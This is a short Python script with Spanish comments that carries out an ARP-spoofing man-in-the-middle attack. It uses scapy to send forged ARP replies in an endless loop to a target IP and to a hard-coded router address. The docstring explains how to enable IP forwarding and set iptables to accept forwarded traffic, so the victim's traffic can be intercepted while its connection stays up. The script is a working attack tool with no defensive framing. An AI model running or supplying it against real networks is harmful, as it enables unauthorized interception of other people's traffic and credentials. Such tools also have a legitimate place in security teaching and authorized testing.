#!/usr/bin/env python3

"""
man in the middle attack with poisoned arp
#NOTE: Configura politicas para forwarding
> sudo iptables --policy FORWARD ACCEPT


#NOTE: Permite que interceptes el flujo sin perder comunicacion la victima
# Verificar que el
/proc/sys/net/ipv4/ip_forward contenga
1
"""

import argparse
import signal
import sys

import scapy.all as scapy
from termcolor import colored


def def_handler(sig, frame):
    print(colored("[!] Saliendo", "red"))
    sys.exit(1)


signal.signal(signal.SIGINT, def_handler)


def get_arguments():
    parser = argparse.ArgumentParser(description="ARP Spoofer")
    parser.add_argument(
        "-t",
        "--target",
        required=True,
        dest="ip_address",
        help="HOST / IP Range to Spoof",
    )
    options = parser.parse_args()
    print(options.ip_address)
    return options


def spoof(ip_address, spoof_ip):
    """
    Envenenamiento de arp para interceptar trafico
    """
    # NOTE: construimos una respuesta a la victima aunque no la solicitara asi
    # que apuntamos a la victima
    arp_packet = scapy.ARP(
        op=2, psrc=spoof_ip, pdst=ip_address, hwsrc="aa:bb:cc:44:55:66"
    )
    # NOTE: Solo enviamos el paquete falcificado
    scapy.send(arp_packet, verbose=False)


def main():
    arguments = get_arguments()
    print(
        colored(
            f"[+] El host a interceptar es {arguments.ip_address}",
            "red",
        )
    )
    router_ip = "192.168.100.1"
    while True:
        spoof(arguments.ip_address, router_ip)
        spoof(router_ip, arguments.ip_address)


if __name__ == "__main__":
    main()
